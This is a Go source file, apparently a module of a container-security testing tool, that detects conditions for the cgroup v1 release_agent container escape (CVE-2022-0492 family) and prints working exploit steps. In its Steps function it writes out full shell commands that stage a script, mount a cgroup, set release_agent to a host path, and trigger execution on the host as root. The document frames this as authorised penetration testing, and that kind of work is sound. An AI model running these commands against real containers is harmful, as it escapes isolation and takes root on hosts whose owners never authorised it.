package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// releaseAgent — the cgroups v1 release_agent escape, made famous by
// CVE-2022-0492. Workloads holding CAP_SYS_ADMIN with a writable
// cgroup v1 hierarchy can have arbitrary commands executed by the host
// kernel as root.
//
// Public references: Trail of Bits writeup, Unit42 (Palo Alto), the CVE.
type releaseAgent struct{ exploit.Base }

func (c *releaseAgent) Matches(results []check.Result) *exploit.Match {
	hasCgroupV1 := exploit.HasFailedID(results, "host.cgroup.writable_v1")
	hasSysAdmin := exploit.EvidenceContains(results, "container.capabilities.dangerous", "CAP_SYS_ADMIN")
	priv := exploit.HasFailedID(results, "container.privileged")

	if !hasCgroupV1 && !priv {
		return nil
	}
	if !hasSysAdmin && !priv {
		return nil
	}
	conf := "medium"
	if hasCgroupV1 && hasSysAdmin {
		conf = "high"
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"host.cgroup.writable_v1", "container.capabilities.dangerous"},
		Confidence: conf,
		Evidence:   []string{"Writable cgroup v1 + CAP_SYS_ADMIN ⇒ release_agent escape primitive available."},
	}
}

func (c *releaseAgent) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Verify writable cgroup v1 hierarchy",
			Command: `mount | grep '^cgroup ' | grep ',rw'`,
			Note:    "If you see at least one rw cgroup mount, you can probably proceed.",
		},
		{
			Title: "Stage the host-side payload",
			Command: `cat > /tmp/cmd.sh <<'EOF'
#!/bin/sh
ip a > /tmp/escape_loot.txt
id  >> /tmp/escape_loot.txt
hostname >> /tmp/escape_loot.txt
EOF
chmod +x /tmp/cmd.sh`,
			Note: "Replace the body with whatever your engagement scope authorizes.",
		},
		{
			Title: "Trigger the escape (CVE-2022-0492 family)",
			Command: `mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$HOST_PATH/cmd.sh" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /tmp/escape_loot.txt`,
			Note: "Adapted from the Trail of Bits public PoC. Requires CAP_SYS_ADMIN + writable cgroup v1.",
		},
	}
}

func init() {
	exploit.Register(&releaseAgent{Base: exploit.Base{
		IDValue:       "chain.cgroup_release_agent",
		NameValue:     "cgroup v1 release_agent escape",
		GoalValue:     "Execute commands on the host kernel as root via the cgroup v1 release_agent mechanism.",
		RiskValue:     exploit.RiskDestructive,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",
			"https://nvd.nist.gov/vuln/detail/CVE-2022-0492",
		},
		AttackValue: []string{"T1611"},
	}})
}
